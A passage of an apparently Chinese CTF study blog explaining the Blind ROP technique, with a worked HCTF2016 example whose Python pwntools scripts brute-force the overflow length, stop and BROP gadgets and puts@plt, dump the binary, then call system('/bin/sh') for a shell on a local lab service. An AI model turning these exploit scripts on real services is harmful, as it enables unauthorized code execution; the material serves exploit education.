gadget，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。</p>\n<p><strong>识别 gadgets</strong></p>\n<p>那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址</p>\n<ul>\n<li><p><strong>Probe</strong></p>\n</li>\n<li><ul>\n<li>探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。</li>\n</ul>\n</li>\n<li><p><strong>Stop</strong></p>\n</li>\n<li><ul>\n<li>不会使得程序崩溃的stop      gadget的地址。</li>\n</ul>\n</li>\n<li><p><strong>Trap</strong></p>\n</li>\n<li><ul>\n<li>可以导致程序崩溃的地址</li>\n</ul>\n</li>\n</ul>\n<p>我们可以通过在栈上摆放不同顺序的<strong>Stop</strong>与 <strong>Trap</strong>从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子</p>\n<ul>\n<li><p>probe,stop,traps(traps,traps,…)</p>\n</li>\n<li><ul>\n<li><p>我们通过程序崩溃与否(<strong>如果程序在probe处直接崩溃怎么判断</strong>)可以找到不会对栈进行pop操作的gadget，如</p>\n</li>\n<li><ul>\n<li>ret</li>\n<li>xor eax,eax; ret</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>probe,trap,stop,traps</p>\n</li>\n<li><ul>\n<li><p>我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如</p>\n</li>\n<li><ul>\n<li>pop rax; ret</li>\n<li>pop rdi; ret</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>probe, trap, trap,     trap, trap, trap, trap, stop, traps</p>\n</li>\n<li><ul>\n<li><p>我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop      gadget相似的gadget。<strong>这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，</strong>这里一般来说会遇到两处比较有意思的地方</p>\n</li>\n<li><ul>\n<li>plt处不会崩，，</li>\n<li>_start处不会崩，相当于程序重新执行。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。</p>\n<p>但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。</p>\n<p>但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。</p>\n<p>此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。</p>\n<p>需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</p>\n<p><strong>寻找PLT</strong></p>\n<p>如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162829637.png\" alt=\"image-20210629162829637\" style=\"zoom:67%;\" />\n\n<p>此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。</p>\n<p><strong>控制rdx</strong></p>\n<p>当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。</p>\n<p>之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址</p>\n<ul>\n<li>readable，可读的地址。</li>\n<li>bad,     非法地址，不可访问，比如说0x0。</li>\n</ul>\n<p>那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况</p>\n<ul>\n<li>strcmp(bad,bad)</li>\n<li>strcmp(bad,readable)</li>\n<li>strcmp(readable,bad)</li>\n<li>strcmp(readable,readable)</li>\n</ul>\n<p>只有最后一种格式，程序才会正常执行。</p>\n<p><strong>注</strong>：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。</p>\n<p>那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法</p>\n<ul>\n<li>利用plt表项的慢路径</li>\n<li>并且利用下一个表项的慢路径的地址来覆盖返回地址</li>\n</ul>\n<p>这样，我们就不用来回控制相应的变量了。</p>\n<p>当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。</p>\n<p><strong>寻找输出函数</strong></p>\n<p>寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。</p>\n<p><strong>寻找write@plt</strong></p>\n<p>当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>\n<ul>\n<li>使用rop     chain，同时使得每个rop对应的文件描述符不一样</li>\n<li>同时打开多个连接，并且我们使用相对较高的数值来试一试。</li>\n</ul>\n<p>需要注意的是</p>\n<ul>\n<li>linux默认情况下，一个进程最多只能打开1024个文件描述符。</li>\n<li>posix标准每次申请的文件描述符数值总是当前最小可用数值。</li>\n</ul>\n<p>当然，我们也可以选择寻找puts函数。</p>\n<p><strong>寻找puts@plt</strong></p>\n<p>寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下</p>\n<p>payload = ‘A’*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</p>\n<p>此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情</p>\n<ul>\n<li>将socket输出重定向到输入输出</li>\n<li>寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。</li>\n<li>执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。</li>\n</ul>\n<p>以HCTF2016的出题人失踪了为例</p>\n<p>1.确定栈溢出长度。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbufferflow_length</span>():</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">            sh.recvuntil(<span class=\"string\">&#x27;WelCome my friend,Do you know password?\\n&#x27;</span>)</span><br><span class=\"line\">            sh.send(i * <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">            output = sh.recv()</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> output.startswith(<span class=\"string\">&#x27;No password&#x27;</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i - <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                i += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> EOFError:</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i - <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。</p>\n<p>2.寻找 stop gadgets。</p>\n<p>寻找过程如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_stop_addr</span>(<span class=\"params\">length</span>):</span></span><br><span class=\"line\">    addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">            sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">            payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr)</span><br><span class=\"line\">            sh.sendline(payload)</span><br><span class=\"line\">            sh.recv()</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;one success addr: 0x%x&#x27;</span> % (addr)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> addr</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br><span class=\"line\">            sh.close()</span><br></pre></td></tr></table></figure>\n\n<p>这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，如果开启了，那就按照开启了的方法做，结果发现了不少，我选择了一个貌似返回到源程序中的地址</p>\n<p>one success stop gadget addr: 0x4006b6</p>\n<p>3.识别brop gadgets。</p>\n<p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_brop_gadget</span>(<span class=\"params\">length, stop_gadget, addr</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class=\"number\">0</span>) * <span class=\"number\">6</span> + p64(</span><br><span class=\"line\">            stop_gadget) + p64(<span class=\"number\">0</span>) * <span class=\"number\">10</span></span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        content = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span> content</span><br><span class=\"line\">        <span class=\"comment\"># stop gadget returns memory</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> content.startswith(<span class=\"string\">&#x27;WelCome&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_brop_gadget</span>(<span class=\"params\">length, addr</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> * <span class=\"number\">10</span></span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        content = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\">addr = <span class=\"number\">0x400740</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check_brop_gadget(length, addr):</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    addr += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>这样，我们基本得到了brop的gadgets地址0x4007ba</p>\n<p>4.确定puts@plt地址。</p>\n<p>根据上面所说，我们可以构造如下payload来进行获取：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">72</span> +p64(pop_rdi_ret)+p64(<span class=\"number\">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>\n\n<p>具体函数如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_puts_addr</span>(<span class=\"params\">length, rdi_ret, stop_gadget</span>):</span></span><br><span class=\"line\">    addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class=\"number\">0x400000</span>) + p64(</span><br><span class=\"line\">            addr) + p64(stop_gadget)</span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            content = sh.recv()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> content.startswith(<span class=\"string\">&#x27;\\x7fELF&#x27;</span>):</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">                <span class=\"keyword\">return</span> addr</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>最后根据plt的结构，选择0x400560作为puts@plt</p>\n<p>5.泄露puts@got地址。</p>\n<p>在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span></span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class=\"line\">        puts_plt) + p64(stop_gadget)</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(payload)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        data = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = data[:data.index(<span class=\"string\">&quot;\\nWelCome&quot;</span>)]</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            data = data</span><br><span class=\"line\">        <span class=\"keyword\">if</span> data == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">            data = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##stop_gadget = get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\"><span class=\"comment\">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class=\"line\">brop_gadget = <span class=\"number\">0x4007ba</span></span><br><span class=\"line\">rdi_ret = brop_gadget + <span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"comment\">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class=\"line\">puts_plt = <span class=\"number\">0x400560</span></span><br><span class=\"line\">addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> addr &lt; <span class=\"number\">0x401000</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        result += data</span><br><span class=\"line\">    addr += <span class=\"built_in\">len</span>(data)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;code&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(result)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>6.最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了’\\x00’，因为puts是输出字符串，字符串是以’\\x00’为终止符的。之后利用ida打开binary模式，首先在edit-&gt;segments-&gt;rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">seg000:0000000000400560                 db 0FFh</span><br><span class=\"line\">seg000:0000000000400561                 db  25h ; %</span><br><span class=\"line\">seg000:0000000000400562                 db 0B2h ;</span><br><span class=\"line\">seg000:0000000000400563                 db  0Ah</span><br><span class=\"line\">seg000:0000000000400564                 db  20h</span><br><span class=\"line\">seg000:0000000000400565                 db    0</span><br><span class=\"line\">#然后按下c,将此处的数据转换为汇编指令，如下</span><br><span class=\"line\">seg000:0000000000400560 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class=\"line\">seg000:0000000000400566 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">seg000:0000000000400566                 push    0</span><br><span class=\"line\">seg000:000000000040056B                 jmp     loc_400550</span><br><span class=\"line\">seg000:000000000040056B ; ---------------------------------------------------------------------------</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这说明，puts@got的地址为0x601018。</p>\n<p>7.程序利用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##stop_gadget = get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\"><span class=\"comment\">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class=\"line\">brop_gadget = <span class=\"number\">0x4007ba</span></span><br><span class=\"line\">rdi_ret = brop_gadget + <span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"comment\">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class=\"line\">puts_plt = <span class=\"number\">0x400560</span></span><br><span class=\"line\"><span class=\"comment\">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class=\"line\">puts_got = <span class=\"number\">0x601018</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">data = sh.recvuntil(<span class=\"string\">&#x27;\\nWelCome&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">puts_addr = u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libc_base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"高级了！！！不敢想象wow-⊙o⊙！！！\"><a href=\"#高级了！！！不敢想象wow-⊙o⊙！！！\" class=\"headerlink\" title=\"高级了！！！不敢想象wow~ ⊙o⊙！！！\"></a>高级了！！！不敢想象wow~ ⊙o⊙！！！</h3><p><strong>ret2_dl_runtime_resolve</strong></p>\n<p>高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。</p>\n<p>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。</p>\n<p>我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, 